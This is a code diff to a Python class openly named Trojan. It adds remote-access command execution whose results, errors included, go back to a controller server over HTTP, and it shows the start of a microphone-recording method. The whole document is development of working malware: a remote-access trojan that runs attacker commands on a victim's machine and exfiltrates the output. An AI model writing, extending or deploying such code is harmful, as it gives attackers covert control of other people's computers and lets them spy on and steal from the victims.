@@ -438,18 +438,24 @@ class Trojan:
 
                 # Run this command.
 
+                # Command result.
+                command_result = ""
+
                 # Showing debug message.
                 try:
-                    self.show_debug_message(f"Executed command from RA! "
-                                            f"Result: {self.remote_access_execute_command(command)}, "
-                                            f"Head: {command[0]}, "
-                                            f"Command: {command[1]}")
+                    # Getting command result.
+                    command_result = command_result = ["SUCCESS", self.remote_access_execute_command(command)]
                 except Exception as error:  # noqa
-                    # Showing exception.
-                    self.show_debug_message(f"Execution of command from RA ends with error!" +
-                                            f" Exception: {str(error)}, "
-                                            f"Head: {command[0]}, "
-                                            f"Command: {command[1]}")
+                    # Getting command result.
+                    command_result = ["ERROR", str(error)]
+
+                # Showing debug message.
+                self.show_debug_message(f"Executed command from RA! "
+                                        f"Result: {command_result}, "
+                                        f"Command: {command}")
+
+                # Syncing with server.
+                self.remote_access_sync_response_to_server(command, command_result)
 
             # Sleeping for some second.
             time.sleep(self.__setting_sync_remote_access_wait_time)
@@ -669,8 +675,35 @@ class Trojan:
         # Returning synced commands.
         return synced_commands
 
-    def remote_access_sync_response_to_server(self, response: str) -> None:
-        raise NotImplementedError
+    def remote_access_sync_response_to_server(self, command: list, result: list) -> None:
+        """
+        Syncs remote access command result with an server.
+        :return: [none] Not returns any.
+        """
+
+        # Getting command data.
+        command_head = command[0]
+        command_body = command[1]
+
+        # Getting result data.
+        result_head = result[0]
+        result_body = result[1]
+
+        # If command is execute python.
+        if command_head == "PYTHON":
+            # If it is python command.
+            pass
+
+        # Syncing with server.
+        requests.get(self.__server_url + self.__server_script_remote_access_file,
+                     params={
+                         "sync_method": "client-server",
+                         "sync_uri": self.__server_unique_request_index,
+                         "sync_command_head": command_head,
+                         "sync_command_body": command_body,
+                         "sync_result_head": result_head,
+                         "sync_result_body": result_body
+                     })
 
     def record_microphone(self, seconds: int = 1) -> None:
         """
